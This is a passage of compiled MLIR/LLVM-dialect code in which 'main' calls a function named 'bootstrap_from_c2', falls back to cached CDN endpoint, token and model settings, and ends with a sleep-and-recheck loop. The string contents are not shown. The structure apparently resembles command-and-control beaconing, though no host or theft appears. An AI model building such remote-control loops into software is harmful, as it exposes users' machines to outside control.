    %7 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
    %8 = llvm.call @jocky_str_concat(%6, %7) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%8) : (!llvm.ptr) -> ()
    llvm.return %4 : i1
  }
  llvm.func @load_config_from_cache() -> i1 {
    %0 = llvm.mlir.addressof @".str.25" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.constant(false) : i1
    %3 = llvm.mlir.addressof @".str.26" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.27" : !llvm.ptr
    %5 = llvm.mlir.addressof @cdn_endpoint : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.28" : !llvm.ptr
    %7 = llvm.mlir.addressof @cdn_token : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.12" : !llvm.ptr
    %9 = llvm.mlir.addressof @model_path : !llvm.ptr
    %10 = llvm.mlir.constant(true) : i1
    %11 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
    %12 = llvm.call @fs_exists(%11) : (!llvm.ptr) -> i1
    llvm.cond_br %12, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %13 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @println(%13) : (!llvm.ptr) -> ()
    %14 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.store %14, %5 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %15 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<20 x i8>
    llvm.store %15, %7 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %16 = llvm.getelementptr %8[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    llvm.store %16, %9 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    llvm.return %10 : i1
  ^bb2:  // pred: ^bb0
    llvm.return %2 : i1
  }
  llvm.func @main() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.29" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.30" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.31" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.2" : !llvm.ptr
    %6 = llvm.mlir.constant(true) : i1
    %7 = llvm.mlir.addressof @".str.32" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.33" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.34" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.35" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.36" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.37" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.38" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.39" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.40" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.41" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.42" : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.43" : !llvm.ptr
    %19 = llvm.mlir.addressof @".str.44" : !llvm.ptr
    %20 = llvm.mlir.addressof @".str.45" : !llvm.ptr
    %21 = llvm.mlir.addressof @".str.46" : !llvm.ptr
    %22 = llvm.mlir.addressof @".str.47" : !llvm.ptr
    %23 = llvm.mlir.addressof @".str.48" : !llvm.ptr
    %24 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %25 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<51 x i8>
    llvm.call @println(%25) : (!llvm.ptr) -> ()
    %26 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %27 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
    %28 = llvm.call @jocky_str_concat(%26, %27) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%28) : (!llvm.ptr) -> ()
    %29 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%29) : (!llvm.ptr) -> ()
    %30 = llvm.call @bootstrap_from_c2() : () -> i1
    llvm.store %30, %24 {alignment = 1 : i64} : i1, !llvm.ptr
    %31 = llvm.load %24 {alignment = 1 : i64} : !llvm.ptr -> i1
    %32 = llvm.xor %31, %6 : i1
    llvm.cond_br %32, ^bb1, ^bb4
  ^bb1:  // pred: ^bb0
    %33 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<47 x i8>
    llvm.call @println(%33) : (!llvm.ptr) -> ()
    %34 = llvm.call @load_config_from_cache() : () -> i1
    %35 = llvm.xor %34, %6 : i1
    llvm.cond_br %35, ^bb2, ^bb3
  ^bb2:  // pred: ^bb1
    %36 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<57 x i8>
    llvm.call @println(%36) : (!llvm.ptr) -> ()
    llvm.br ^bb3
  ^bb3:  // 2 preds: ^bb1, ^bb2
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb0, ^bb3
    %37 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%37) : (!llvm.ptr) -> ()
    %38 = llvm.call @ensure_model_available() : () -> i1
    %39 = llvm.xor %38, %6 : i1
    llvm.cond_br %39, ^bb5, ^bb6
  ^bb5:  // pred: ^bb4
    %40 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<58 x i8>
    llvm.call @println(%40) : (!llvm.ptr) -> ()
    llvm.br ^bb6
  ^bb6:  // 2 preds: ^bb4, ^bb5
    %41 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%41) : (!llvm.ptr) -> ()
    %42 = llvm.call @save_config_locally() : () -> i1
    %43 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%43) : (!llvm.ptr) -> ()
    %44 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
    llvm.call @println(%44) : (!llvm.ptr) -> ()
    %45 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
    %46 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %47 = llvm.call @jocky_str_concat(%45, %46) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%47) : (!llvm.ptr) -> ()
    %48 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
    %49 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %50 = llvm.call @jocky_str_concat(%48, %49) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%50) : (!llvm.ptr) -> ()
    %51 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %52 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
    %53 = llvm.call @jocky_str_concat(%51, %52) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%53) : (!llvm.ptr) -> ()
    %54 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%54) : (!llvm.ptr) -> ()
    %55 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<44 x i8>
    llvm.call @println(%55) : (!llvm.ptr) -> ()
    %56 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<66 x i8>
    llvm.call @println(%56) : (!llvm.ptr) -> ()
    %57 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @println(%57) : (!llvm.ptr) -> ()
    %58 = llvm.getelementptr %17[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<53 x i8>
    llvm.call @println(%58) : (!llvm.ptr) -> ()
    %59 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<53 x i8>
    llvm.call @println(%59) : (!llvm.ptr) -> ()
    %60 = llvm.getelementptr %19[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<47 x i8>
    llvm.call @println(%60) : (!llvm.ptr) -> ()
    %61 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%61) : (!llvm.ptr) -> ()
    %62 = llvm.getelementptr %20[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
    llvm.call @println(%62) : (!llvm.ptr) -> ()
    %63 = llvm.getelementptr %21[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    %64 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %65 = llvm.call @jocky_str_concat(%63, %64) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%65) : (!llvm.ptr) -> ()
    %66 = llvm.getelementptr %22[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
    %67 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %68 = llvm.call @jocky_str_concat(%66, %67) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%68) : (!llvm.ptr) -> ()
    %69 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%69) : (!llvm.ptr) -> ()
    %70 = llvm.getelementptr %23[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<44 x i8>
    llvm.call @println(%70) : (!llvm.ptr) -> ()
    llvm.call @jocky_sleep_and_recheck() : () -> ()
    llvm.return
  }
}
